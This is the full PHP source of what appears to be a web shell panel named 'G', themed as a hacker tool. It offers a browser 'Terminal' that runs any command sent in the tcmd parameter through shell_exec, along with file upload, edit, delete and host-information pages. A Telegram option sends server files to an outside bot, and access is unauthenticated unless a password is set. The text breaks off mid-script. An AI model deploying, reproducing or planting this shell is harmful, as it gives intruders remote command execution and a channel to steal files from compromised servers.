<?php
$panel_name = 'G';
session_start();

$db_file = '.gpanel_db.json';

function get_db() {
    global $db_file;
    if (!file_exists($db_file)) {
        return ['locked' => false, 'password_hash' => null];
    }
    $content = @file_get_contents($db_file);
    return $content ? json_decode($content, true) : ['locked' => false, 'password_hash' => null];
}

function save_db($data) {
    global $db_file;
    file_put_contents($db_file, json_encode($data, JSON_PRETTY_PRINT));
}

if (!file_exists($db_file)) {
    save_db(['locked' => false, 'password_hash' => null]);
}

$db = get_db();

if ($db['locked'] && !isset($_SESSION['gpanel_logged_in'])) {
    $login_error = '';
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
        if (password_verify($_POST['password'], $db['password_hash'])) {
            $_SESSION['gpanel_logged_in'] = true;
            header('Location: ' . $_SERVER['PHP_SELF'] . '?' . http_build_query($_GET));
            exit;
        } else {
            $login_error = 'Incorrect password.';
        }
    }
    
    echo '<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Login - ' . $panel_name . '</title><style>body{background:#121212;color:#e0e0e0;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;}.login-container{background:rgb(30,30,30);padding:40px;border-radius:8px;box-shadow:0 4px 12px rgba(0,0,0,0.7);text-align:center;width:90%;max-width:350px;}h1{margin-bottom:20px;color:#4da6ff;}input[type=password]{width:100%;box-sizing:border-box;padding:12px;margin:10px 0;border:none;border-radius:5px;background:rgb(51,51,51);color:#e0e0e0;}input[type=submit]{padding:12px;border:none;border-radius:5px;background:#4da6ff;color:#fff;cursor:pointer;width:100%;}.error{color:#ff4d4d;margin-top:10px;}</style></head><body><div class="login-container"><h1>' . $panel_name . ' Locked</h1><form method="post"><input type="password" name="password" placeholder="Enter Password" required><br><input type="submit" value="Unlock"></form>';
    if (isset($login_error)) {
        echo '<div class="error">' . $login_error . '</div>';
    }
    echo '</div></body></html>';
    exit;
}

if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

function g1($x){ return htmlspecialchars(strip_tags($x)); }
function format_bytes($bytes, $precision = 2) { 
    $units = ['B', 'KB', 'MB', 'GB', 'TB']; 
    $bytes = max($bytes, 0); 
    $pow = floor(($bytes ? log($bytes) : 0) / log(1024)); 
    $pow = min($pow, count($units) - 1); 
    $bytes /= pow(1024, $pow);
    return round($bytes, $precision) . ' ' . $units[$pow]; 
}
function recursive_delete($path) {
    if (is_dir($path)) {
        $files = array_diff(scandir($path), ['.', '..']);
        foreach ($files as $file) {
            recursive_delete($path . DIRECTORY_SEPARATOR . $file);
        }
        return rmdir($path);
    } else {
        return unlink($path);
    }
}

if(isset($_GET['telegram_download'])){
    $dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
    $file_path = $dir . '/' . basename($_GET['file']);
    if(file_exists($file_path) && is_file($file_path)){
        $token = $_GET['token'];
        $chat_id = $_GET['chat_id'];
        $url = "https://api.telegram.org/bot" . $token . "/sendDocument";
        $post_fields = ['chat_id' => $chat_id, 'document' => new CURLFile(realpath($file_path))];
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type:multipart/form-data"]);
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
        $output = curl_exec($ch);
        curl_close($ch);
        echo $output;
    } else {
        http_response_code(404);
        echo "File not found.";
    }
    exit;
}

if(isset($_GET['download'])){
    $dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
    $file_path = $dir . '/' . basename($_GET['file']);
    if(file_exists($file_path) && is_file($file_path)){
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($file_path).'"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file_path));
        readfile($file_path);
    } else {
        http_response_code(404);
        echo "File not found.";
    }
    exit;
}

if(isset($_GET['tcmd'])){
    $_c = trim($_GET['tcmd']);
    $output = '';
    if(function_exists('shell_exec')) {
        $output = shell_exec($_c . ' 2>&1');
    } else {
        $output = "shell_exec is disabled.";
    }
    echo nl2br(htmlspecialchars($output));
    exit;
}

$_p = isset($_GET['page']) ? $_GET['page'] : 'home';
$_d = isset($_GET['dir']) ? realpath($_GET['dir']) : getcwd();
if (!$_d || !is_dir($_d)) {
    $_d = getcwd();
}

?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo $panel_name; ?></title>
    <link rel="icon" href="https://cdn1.iconfinder.com/data/icons/social-black-buttons/512/anonymous-512.png">
    <link href="https://fonts.googleapis.com/css?family=Roboto:400,500,700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.15/codemirror.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.15/theme/dracula.min.css">
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { font-family:"Roboto", sans-serif; background: #121212; color: #e0e0e0; }
        #matrixCanvas { position:fixed; top:0; left:0; width:100%; height:100%; z-index:-1; }
        #header { background: rgb(30,30,30); padding:15px 20px; display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid #333; flex-wrap: wrap; gap: 1rem; }
        #header h1 { font-size:1.8em; }
        #nav { display: flex; flex-wrap: wrap; justify-content: center; }
        #nav a { color:#e0e0e0; margin: 5px 10px; text-decoration:none; font-weight:500; transition:color .3s; }
        #nav a:hover { color:#4da6ff; }
        #container { padding: 20px; }
        .content-box { background: rgba(30, 30, 30, 0.85); backdrop-filter: blur(10px); -webkit-backdrop-filter: blur(10px); padding:30px; border-radius:8px; box-shadow:0 4px 12px rgba(0,0,0,0.7); animation:fadeIn 1s; margin: 20px auto; }
        h2, h3 { text-align:center; margin-bottom:20px; }
        p { margin-bottom:20px }
        .breadcrumb { margin-bottom:20px; padding:10px; background: rgb(42,42,42); border-radius:5px; display:inline-block; }
        .breadcrumb-item a { color:#4da6ff; text-decoration:none; }
        .breadcrumb-separator { margin:0 5px; color:#e0e0e0; }
        .file-list { list-style:none; padding:0 }
        .file-list li { display:flex; align-items:center; background: rgb(42,42,42); margin-bottom:8px; padding:8px 12px; border-radius:5px; transition:background .3s; position: relative; }
        .file-list li:hover { background:#333; }
        .file-list li.menu-open { z-index: 10; }
        .file-info { display:flex; align-items: center; flex-grow: 1; cursor:pointer; min-width: 0; }
        .file-details { display:flex; flex-direction:column; min-width: 0; }
        .fn { font-weight:bold; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
        .details { font-size:0.8em; color:#aaa; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
        .dd { position:relative; }
        .ddb { background:transparent; border:none; color:#e0e0e0; font-size:1.2em; cursor:pointer; padding: 5px; }
        .ddc { display:none; position:absolute; right:0; top: 100%; background: rgb(50,50,50); min-width:140px; border-radius:5px; box-shadow:0 8px 16px rgba(0,0,0,0.3); z-index:9999; }
        .ddc a { color:#e0e0e0; padding:8px 12px; text-decoration:none; display:block; transition:background .3s; }
        .ddc a:hover { background:#555; }
        .dd.open .ddc { display:block; }
        form { margin-top:20px; display:flex; flex-direction:column; gap:15px; }
        input[type="text"], input[type="password"], input[type="file"], textarea { width:100%; padding:12px; border:none; border-radius:5px; background: rgb(51,51,51); color:#e0e0e0; font-size:1em; outline:none; transition:background .3s; }
        input[type="submit"], button, .btn { padding:12px; border:none; border-radius:5px; background:#4da6ff; color:#fff; font-size:1em; font-weight:bold; cursor:pointer; transition: background .3s; text-decoration: none; }
        input[type="submit"]:hover, button:hover, .btn:hover { background:#80c1ff; }
        .btn-danger { background:#ff4d4d; }
        .btn-danger:hover { background:#ff1a1a; }
        hr { border:0; height:1px; background:#555; margin:30px 0 }
        .CodeMirror { height:60vh; border:1px solid #444; font-size:1em; background: rgb(46,46,46); color:#e0e0e0; border-radius: 5px; }
        .modal-overlay { position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.8); display:none; align-items:center; justify-content:center; z-index:10000; }
        .modal { background: rgb(30,30,30); padding:20px; border-radius:8px; width:90%; max-width:400px; text-align:center; position: relative; }
        .close-modal { position: absolute; top: 8px; right: 8px; cursor: pointer; font-size: 24px; color: #e0e0e0; }
        .file-checkbox { -webkit-appearance: none; -moz-appearance: none; appearance: none; width: 18px; height: 18px; background-color: #333; border: 1px solid #555; border-radius: 3px; cursor: pointer; position: relative; outline: none; transition: background-color 0.2s; margin-right: 15px; }
        .file-checkbox:checked { background-color: #4da6ff; border-color: #4da6ff; }
        .file-checkbox:checked::after { content: ''; position: absolute; left: 5px; top: 1px; width: 5px; height: 10px; border: solid white; border-width: 0 3px 3px 0; transform: rotate(45deg); }
        .action-bar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 1.5rem; flex-wrap: wrap; gap: 1rem; }
        #multi-select-actions { display: none; gap: 1rem; flex-wrap: wrap; }
        @keyframes fadeIn { from { opacity:0; transform:translateY(20px); } to { opacity:1; transform:translateY(0); } }
    </style>
</head>
<body>
    <canvas id="matrixCanvas"></canvas>
    
    <div id="header">
        <h1><?php echo $panel_name; ?></h1>
        <div id="nav">
            <a href="?page=home&dir=<?php echo urlencode($_d); ?>">File Manager</a>
            <a href="?page=upload&dir=<?php echo urlencode($_d); ?>">Upload File</a>
            <a href="?page=terminal&dir=<?php echo urlencode($_d); ?>">Terminal</a>
            <a href="?page=info&dir=<?php echo urlencode($_d); ?>">Info</a>
            <a href="?page=security&dir=<?php echo urlencode($_d); ?>">Security</a>
            <a href="https://github.com/ERRORIP" target="_blank">GitHub</a>
            <?php if ($db['locked']): ?>
                <a href="?logout=1">Logout</a>
            <?php endif; ?>
        </div>
    </div>
    <div id="container">
        <div class="content-box">
        <?php
        function g2_breadcrumb($x){
            $x=str_replace("\\","/",$x);
            $parts=array_filter(explode("/",$x),'strlen');
            $r='<div class="breadcrumb"><span class="breadcrumb-item"><a href="?page=home&dir=/">/</a></span>';
            $cp="";
            foreach($parts as $p){
                $cp.="/".$p;
                $r.='<span class="breadcrumb-separator">/</span><span class="breadcrumb-item"><a href="?page=home&dir='.urlencode($cp).'">'.$p.'</a></span>';
            }
            return $r.'</div>';
        }

        function g3_file_manager($x){
            echo '<div class="action-bar">';
            echo '<div><label style="display:flex; align-items:center; gap:10px; cursor: pointer;"><input type="checkbox" id="select-all" class="file-checkbox" style="margin-right:10px;"> Select All</label></div>';
            echo '<div id="multi-select-actions"><button id="download-selected-btn" class="btn">Download</button><button id="compress-selected-btn" class="btn">Compress</button><button id="move-selected-btn" class="btn">Move</button><button id="delete-selected-btn" class="btn btn-danger">Delete</button></div>';
            echo '</div>';
            
            $f=scandir($x);
            $fh=array(); $ff=array();
            foreach($f as $v){
                if($v=="."||$v=="..") continue;
                $p=$x."/".$v;
                $m=date("Y-m-d H:i:s",filemtime($p));
                $perm=substr(sprintf('%o',fileperms($p)),-4);
                
                $item_html_start = '<li><input type="checkbox" class="file-checkbox" value="'.g1($v).'">';
                
                if(is_dir($p)){
                    $d='<div class="details">Directory | Modify: '.$m.' | Perms: '.$perm.'</div>';
                    $item_html_content = '<div class="file-info" onclick="window.location.href=\'?page=home&dir='.urlencode($p).'\';"><img src="https://www.iconpacks.net/icons/2/free-icon-folder-1485.png" style="width:20px;vertical-align:middle;margin-right:5px;"><div class="file-details"><span class="fn">'.$v.'</span>'.$d.'</div></div>';
                    $item_html_end = '<div style="margin-left:auto;"></div><div class="dd"><button class="ddb" onclick="td(this,event)">&#8942;</button><div class="ddc"><a href="?page=view&file='.urlencode($v).'&dir='.urlencode($x).'">View</a><a href="?page=move&file='.urlencode($v).'&dir='.urlencode($x).'">Move</a><a href="?page=rename&file='.urlencode($v).'&dir='.urlencode($x).'">Rename</a><a href="?action=compress_single&file='.urlencode($v).'&dir='.urlencode($x).'">Compress</a><a href="?action=delete_single&file='.urlencode($v).'&dir='.urlencode($x).'" onclick="return confirm(\'Sure?\')">Delete</a></div></div></li>';
                    $fh[] = $item_html_start . $item_html_content . $item_html_end;
                } else {
                    $s=filesize($p);
                    $rs=format_bytes($s);
                    $d='<div class="details">Size: '.$rs.' | Modify: '.$m.' | Perms: '.$perm.'</div>';
                    $item_html_content = '<div class="file-info" onclick="location.href=\'?page=edit&file='.urlencode($v).'&dir='.urlencode($x).'\'"><img src="https://images.freeimages.com/fic/images/icons/2813/flat_jewels/512/file.png" style="width:20px;vertical-align:middle;margin-right:5px;"><div class="file-details"><span class="fn">'.$v.'</span>'.$d.'</div></div>';
                    
                    $actions = '<a href="?page=view&file='.urlencode($v).'&dir='.urlencode($x).'">View</a><a href="?page=edit&file='.urlencode($v).'&dir='.urlencode($x).'">Edit</a><a href="?page=move&file='.urlencode($v).'&dir='.urlencode($x).'">Move</a><a href="javascript:void(0)" onclick="openDownloadModal(\''.g1($v).'\')">Download</a><a href="?page=rename&file='.urlencode($v).'&dir='.urlencode($x).'">Rename</a>';
                    
                    $ext = pathinfo($p, PATHINFO_EXTENSION);
                    if ($ext === 'zip') {
                        $actions .= '<a href="?action=unzip&file='.urlencode($v).'&dir='.urlencode($x).'">Unzip</a>';
                    } else {
                         $actions .= '<a href="?action=compress_single&file='.urlencode($v).'&dir='.urlencode($x).'">Compress</a>';
                    }

                    $actions .= '<a href="?action=delete_single&file='.urlencode($v).'&dir='.urlencode($x).'" onclick="return confirm(\'Sure?\');">Delete</a>';

                    $item_html_end = '<div style="margin-left:auto;"></div><div class="dd"><button class="ddb" onclick="td(this,event)">&#8942;</button><div class="ddc">'.$actions.'</div></div></li>';
                    $ff[] = $item_html_start . $item_html_content . $item_html_end;
                }
            }
            echo '<ul class="file-list">'.implode("",$fh).(count($fh)&&count($ff)?'<hr>':'').implode("",$ff).'</ul>';
        }

        function g4_create_folder($x,$n){
            $n=g1($n);
            $p=$x."/".$n;
            if(!file_exists($p)){
                mkdir($p);
                echo "<p style=\"color:#4da6ff;text-align:center;\">Folder '$n' created. <a href='?page=home&dir=".urlencode($x)."'>Refresh</a></p>";
            } else {
                echo "<p style=\"color:#ff4d4d;text-align:center;\">Folder '$n' exists.</p>";
            }
        }

        function g5_upload_file($x,$f){
            if(!is_dir($x)){
                echo "<p style=\"color:#ff4d4d;text-align:center;\">Directory does not exist.</p>";
                return;
            }
            $t=$x."/".basename($f['name']);
            if(move_uploaded_file($f['tmp_name'],$t)){
                echo "<p style=\"color:#4da6ff;text-align:center;\">File ".g1(basename($f['name']))." uploaded.</p>";
            } else {
                echo "<p style=\"color:#ff4d4d;text-align:center;\">Upload error.</p>";
            }
        }

        function g6_edit_file($p){
            if($_SERVER['REQUEST_METHOD']==='POST' && isset($_POST['file_content'])){
                $c=$_POST['file_content'];
                if(file_put_contents($p,$c)!==false){
                    echo "<p style=\"color:#4da6ff;text-align:center;\">Saved.</p>";
                } else {
                    echo "<p style=\"color:#ff4d4d;text-align:center;\">Save error.</p>";
                }
            }
            $c=file_get_contents($p);
            echo '<form method="post"><textarea id="codeEditor" name="file_content">'.htmlspecialchars($c).'</textarea><br><input type="submit" value="Save" class="btn"></form><br><a href="?page=home&dir='.urlencode(dirname($p)).'" class="btn btn-danger">Back</a>';
        }

        if(isset($_GET['action'])){
            $_a=$_GET['action'];
            switch($_a){
                case 'unzip':
                    if (isset($_GET['file'])) {
                        $file = g1($_GET['file']);
                        $path = $_d . '/' . $file;
                        if (file_exists($path) && pathinfo($path, PATHINFO_EXTENSION) == 'zip') {
                            $zip = new ZipArchive;
                            if ($zip->open($path) === TRUE) {
                                $zip->extractTo($_d);
                                $zip->close();
                                echo "<p style='color:#4da6ff;'>File unzipped successfully.</p>";
                            } else {
                                echo "<p style='color:#ff4d4d;'>Failed to unzip the file.</p>";
                            }
                        } else {
                            echo "<p style='color:#ff4d4d;'>File is not a valid zip archive.</p>";
                        }
                    }
                    echo '<a href="?page=home&dir='.urlencode($_d).'" class="btn">Back</a>';
                    break;
                case 'delete_single': if(isset($_GET['file'])){ $p = $_d."/".g1($_GET['file']); if(file_exists($p)){ if(recursive_delete($p)) echo "<p style='color:#4da6ff;'>Deleted.</p>"; else echo "<p style='color:#ff4d4d;'>Delete error.</p>"; } } echo '<a href="?page=home&dir='.urlencode($_d).'" class="btn">Back</a>'; break;
                case 'delete_selected': if (isset($_POST['files']) && is_array($_POST['files'])) { $all_deleted = true; foreach($_POST['files'] as $file) { $p = $_d . '/' . g1($file); if (file_exists($p)) { if (!recursive_delete($p)) $all_deleted = false; } } if($all_deleted) echo "<p style='color:#4da6ff;'>Selected items deleted.</p>"; else echo "<p style='color:#ff4d4d;'>Error deleting some items.</p>"; } echo '<a href="?page=home&dir='.urlencode($_d).'" class="btn">Back</a>'; break;
                case 'move_selected': if (isset($_POST['files']) && is_array($_POST['files']) && isset($_POST['destination'])) { $all_moved = true; $dest = g1($_POST['destination']); if (is_dir($dest)) { foreach($_POST['files'] as $file) { $old = $_d . '/' . g1($file); $new = $dest . '/' . g1($file); if (file_exists($old)) { if (!rename($old, $new)) $all_moved = false; } } if($all_moved) echo "<p style='color:#4da6ff;'>Selected items moved.</p>"; else echo "<p style='color:#ff4d4d;'>Error moving some items.</p>"; } else { echo "<p style='color:#ff4d4d;'>Invalid destination directory.</p>"; } } echo '<a href="?page=home&dir='.urlencode($_d).'" class="btn">Back</a>'; break;
                case 'compress_single': case 'compress_selected': $is_multi_download = $_a === 'compress_selected'; if (isset($_GET['file'])) $_POST['files'] = [$_GET['file']]; if (isset($_POST['files']) && is_array($_POST['files']) && count($_POST['files']) > 0) { $files_to_zip = $_POST['files']; $zip_filename = 'gpanel_archive_' . time() . '.zip'; $zip_path = $_d . '/' . $zip_filename; $zip = new ZipArchive(); if ($zip->open($zip_path, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== TRUE) die("Error creating ZIP."); foreach($files_to_zip as $file_or_folder) { $path = $_d . '/' . g1($file_or_folder); if(!file_exists($path)) continue; if(is_dir($path)) { $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::LEAVES_ONLY); foreach ($files as $name => $file) { if (!$file->isDir()) { $filePath = $file->getRealPath(); $relativePath = g1($file_or_folder) . '/' . substr($filePath, strlen($path) + 1); $zip->addFile($filePath, $relativePath); } } } else $zip->addFile($path, g1($file_or_folder)); } $zip->close(); if ($is_multi_download) { header('Content-Type: application/zip'); header('Content-Disposition: attachment; filename="' . basename($zip_path) . '"'); header('Content-Length: ' . filesize($zip_path)); readfile($zip_path); unlink($zip_path); exit; } else echo "<p style='color:#4da6ff;'>Compressed to $zip_filename.</p><a href='?page=home&dir=".urlencode($_d)."' class='btn'>Back</a>"; } else echo "<p style='color:#ff4d4d;'>No files selected.</p><a href='?page=home&dir=".urlencode($_d)."' class='btn'>Back</a>"; break;
                default: echo "<p style='color:#ff4d4d;'>Invalid action.</p><a href='?page=home&dir=".urlencode($_d)."' class='btn'>Back</a>";
            }
        } else {
            switch($_p){
                case 'edit': case 'view':
                    if(isset($_GET['file'])){
                        $file = g1($_GET['file']); $path = $_d . "/" . $file;
                        if(file_exists($path) && is_file($path)){
                            echo "<h2>".ucfirst($_p).": ".htmlspecialchars($file)."</h2>"; echo g2_breadcrumb($_d); echo '<a href="?page=home&dir='.urlencode($_d).'" class="btn" style="margin-bottom:1rem;">Back</a>';
                            if ($_p === 'edit') g6_edit_file($path); else echo "<pre style='background:rgb(46,46,46);padding:15px;border-radius:5px;overflow:auto;max-height:70vh;'>".htmlspecialchars(file_get_contents($path))."</pre>";
                        } else echo "<p style='color:#ff4d4d;'>Not found.</p>";
                    }
                    break;
                case 'rename': case 'move':
                     if(isset($_GET['file'])){
                        $file = g1($_GET['file']); $old_path = $_d . "/" . $file;
                        echo "<h2>".ucfirst($_p).": ".htmlspecialchars($file)."</h2>"; echo g2_breadcrumb($_d);
                        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                            if($_p === 'rename' && isset($_POST['new_name'])){
                                $new_path = $_d . "/" . g1($_POST['new_name']);
                                if(rename($old_path, $new_path)) echo "<p style='color:#4da6ff;'>Renamed.</p>"; else echo "<p style='color:#ff4d4d;'>Rename error.</p>";
                            } elseif ($_p === 'move' && isset($_POST['target_dir'])) {
                                $new_path = g1($_POST['target_dir']) . "/" . $file;
                                if(is_dir(g1($_POST['target_dir'])) && rename($old_path, $new_path)) echo "<p style='color:#4da6ff;'>Moved.</p>"; else echo "<p style='color:#ff4d4d;'>Move error. Invalid directory?</p>";
                            }
                             echo '<a href="?page=home&dir='.urlencode($_d).'" class="btn">Back</a>';
                        } else {
                            echo '<a href="?page=home&dir='.urlencode($_d).'" class="btn" style="margin-bottom:1rem;">Back</a><form method="post">';
                            if($_p === 'rename') echo 'New Name: <input type="text" name="new_name" value="'.htmlspecialchars($file).'" required>';
                            if($_p === 'move') echo 'Target Directory: <input type="text" name="target_dir" value="'.htmlspecialchars($_d).'" required>';
                            echo '<input type="submit" value="'.ucfirst($_p).'" class="btn"></form>';
                        }
                    }
                    break;
                case 'upload':
                    echo "<h2>Upload File</h2>";
                    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file_to_upload'])) {
                        g5_upload_file(isset($_POST['target_dir']) ? g1($_POST['target_dir']) : $_d, $_FILES['file_to_upload']);
                    }
                    echo '<form method="post" enctype="multipart/form-data">Target: <input type="text" name="target_dir" value="'.htmlspecialchars($_d).'" required><br>Select file: <input type="file" name="file_to_upload" required><br><input type="submit" value="Upload" class="btn"></form>';
                    break;
                case 'terminal':
                     echo '<h2>Terminal</h2><div id="terminal-container" style="height: 60vh; background: #1e1e1e; border-radius: 8px; padding: 1rem; border:1px solid #444; overflow-y:auto; font-family: monospace;"></div>';
                     break;
                case 'info':
                    echo '<h2>Host Information</h2><div style="overflow-x:auto;"><table style="width:100%; border-collapse:collapse;">';
                    $info = [ 'Uname' => php_uname(), 'PHP Version' => phpversion(), 'Server Software' => $_SERVER['SERVER_SOFTWARE'] ?? 'N/A', 'Server IP' => $_SERVER['SERVER_ADDR'] ?? 'N/A', 'Your IP' => $_SERVER['REMOTE_ADDR'] ?? 'N/A', 'Disk Space' => format_bytes(disk_free_space('/')) . ' Free / ' . format_bytes(disk_total_space('/')) . ' Total' ];
                    foreach($info as $key => $value){ echo '<tr><th style="padding:10px; border:1px solid #444; text-align:left; background:#333;">'.$key.'</th><td style="padding:10px; border:1px solid #444;">'.$value.'</td></tr>'; }
                    echo '</table></div>';
                    break;
                case 'security':
                    echo "<h2>Security Settings</h2>";
                    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                        if (isset($_POST['set_password'])) {
                            if (!empty($_POST['new_password']) && $_POST['new_password'] === $_POST['confirm_password']) {
                                $db['locked'] = true; $db['password_hash'] = password_hash($_POST['new_password'], PASSWORD_DEFAULT); save_db($db); $_SESSION['gpanel_logged_in'] = true;
                                echo "<p style='color:#4da6ff;'>Lock enabled.</p>";
                            } else echo "<p style='color:#ff4d4d;'>Passwords do not match.</p>";
                        } elseif (isset($_POST['remove_password'])) {
                            $db['locked'] = false; $db['password_hash'] = null; save_db($db); unset($_SESSION['gpanel_logged_in']);
                            echo "<p style='color:#4da6ff;'>Lock disabled.</p>";
                        }
                    }
                    $db = get_db();
                    if ($db['locked']) echo "<p>Gpanel is locked.</p><form method='post'><button type='submit' name='remove_password' class='btn btn-danger'>Disable Lock</button></form>";
                    else echo "<p>Gpanel is unlocked.</p><h3>Set password to lock:</h3><form method='post'>New Password: <input type='password' name='new_password' required><br>Confirm: <input type='password' name='confirm_password' required><br><input type='submit' name='set_password' value='Set Password & Lock' class='btn'></form>";
                    break;
                default:
                    echo "<h2>File Manager</h2>"; echo g2_breadcrumb($_d); echo '<a href="?page=home&dir='.urlencode(dirname($_d)).'" class="btn" style="margin-bottom: 20px; display: inline-block; margin-left: 10px;">&larr; Up</a>'; g3_file_manager($_d);
                    echo '<hr><h3>Create New Folder:</h3><form method="post"><input type="text" name="folder_name" placeholder="Folder name" required><input type="submit" name="create_folder" value="Create" class="btn"></form>';
                    if (isset($_POST['create_folder'])) g4_create_folder($_d, $_POST['folder_name']);
            }
        }
        ?>
        </div>
    </div>
    <footer style="text-align:center; padding:20px; color:#aaa;">Created By <a href="https://github.com/ERRORIP" target="_blank" style="color:#4da6ff; text-decoration:none;">ERRORIP</a></footer>
    <div id="downloadModal" class="modal-overlay">
        <div class="modal">
            <span class="close-modal" onclick="closeDownloadModal()">×</span>
            <h3>Download Options</h3>
            <p id="downloadFileName" style="margin-bottom:15px; font-weight:bold;"></p>
            <form id="telegramForm" style="display: flex; flex-direction: column; gap: 1rem;">
                <h4>Send to Telegram</h4>
                <input type="text" id="telegramToken" placeholder="Bot Token">
                <input type="text" id="telegramChatId" placeholder="Chat ID">
                <button type="button" id="sendTelegramBtn" class="btn">Send</button>
            </form>
            <hr>
            <h4>Direct Download</h4>
            <button id="downloadFileBtn" class="btn">Download</button>
        </div>
    </div>
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.15/codemirror.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.15/mode/meta.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.15/addon/edit/closebrackets.min.js"></script>
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.15/mode/xml/xml.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.15/mode/javascript/javascript.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.15/mode/css/css.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.15/mode/clike/clike.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.15/mode/htmlmixed/htmlmixed.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.15/mode/php/php.min.js"></script>

    <script>
        function matrixEffect(){
            var c=document.getElementById("matrixCanvas"), ctx=c.getContext("2d");
            c.height=window.innerHeight; c.width=window.innerWidth;
            var l="ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789".split(""), fs=16, cols=c.width/fs, drops=[];
            for(var i=0;i<cols;i++) drops[i]=1;
            function d(){
                ctx.fillStyle="rgba(18,18,18,0.05)"; ctx.fillRect(0,0,c.width,c.height);
                ctx.fillStyle="#790604"; ctx.font=fs+"px monospace";
                for(var j=0;j<drops.length;j++){
                    var t=l[Math.floor(Math.random()*l.length)];
                    ctx.fillText(t,j*fs,drops[j]*fs);
                    if(drops[j]*fs>c.height&&Math.random()>0.975) drops[j]=0;
                    drops[j]++;
                }
            }
            setInterval(d,35);
        }
        matrixEffect();

        function td(el, ev) {
            ev.stopPropagation();
            const dd = el.parentElement;
            const li = dd.closest('li');
            const wasOpen = dd.classList.contains("open");
            
            document.querySelectorAll(".dd").forEach(d => {
                d.classList.remove("open");
                d.closest('li').classList.remove('menu-open');
            });

            if (!wasOpen) {
                dd.classList.add("open");
                if (li) li.classList.add('menu-open');
            }
        }
        document.addEventListener("click", () => {
            document.querySelectorAll(".dd").forEach(d => {
                d.classList.remove("open");
                 d.closest('li').classList.remove('menu-open');
            });
        });

        if (document.getElementById("codeEditor")) {
            const h2 = document.querySelector('h2');
            let filename = h2 ? (h2.textContent.match(/:\s*(.*)$/)?.[1] || '') : '';
            const info = CodeMirror.findModeByFileName(filename);
            
            CodeMirror.fromTextArea(document.getElementById("codeEditor"), {
                lineNumbers: true,
                theme: "dracula",
                lineWrapping: true,
                autoCloseBrackets: true,
                mode: info ? info.mime : 'text/plain'
            });
        }
        
        const termContainer = document.getElementById('terminal-container');
        if (termContainer) {
            termContainer.insertAdjacentHTML('afterend', '<form id="term-form" style="margin-top:10px; display:flex; gap: 0.5rem;"><input type="text" id="termInput" placeholder="Enter command"><button type="submit" class="btn">Send</button></form>');
            document.getElementById('term-form').addEventListener('submit', function(e) {
                e.preventDefault();
                const termInput = document.getElementById('termInput');
                const cmd = termInput.value;
                if (cmd.trim() === "") return;
                termContainer.innerHTML += `<div><span style="color:#4da6ff;">$</span> ${cmd}</div>`;
                fetch("?tcmd=" + encodeURIComponent(cmd)).then(r => r.text()).then(d => {
                    termContainer.innerHTML += `<pre style="white-space: pre-wrap; word-wrap: break-word; margin: 0; padding: 0;">${d}</pre>`;
                    termContainer.scrollTop = termContainer.scrollHeight;
                });
                termInput.value = "";
            });
        }
        
        const selectAll = document.getElementById('select-all');
        if (selectAll) {
            const checkboxes = document.querySelectorAll('.file-checkbox');
            const multiSelectActions = document.getElementById('multi-select-actions');
            
            function toggleActions() {
                const anyChecked = document.querySelectorAll('.file-checkbox:checked').length > 0;
                multiSelectActions.style.display = anyChecked ? 'flex' : 'none';
            }
            selectAll.addEventListener('change', (e) => { checkboxes.forEach(cb => cb.checked = e.target.checked); toggleActions(); });
            checkboxes.forEach(cb => cb.addEventListener('change', toggleActions));
            
            function createAndSubmitForm(action, extraData = {}) {
                const selectedFiles = Array.from(document.querySelectorAll('.file-checkbox:checked')).map(cb => cb.value);
                if (selectedFiles.length === 0) { alert("No items selected."); return; }
                const form = document.createElement('form');
                const currentDir = new URLSearchParams(window.location.search).get('dir') || '<?php echo getcwd(); ?>';
                form.method = 'POST';
                form.action = `?action=${action}&dir=${encodeURIComponent(currentDir)}`;
                selectedFiles.forEach(fileName => {
                    const input = document.createElement('input');
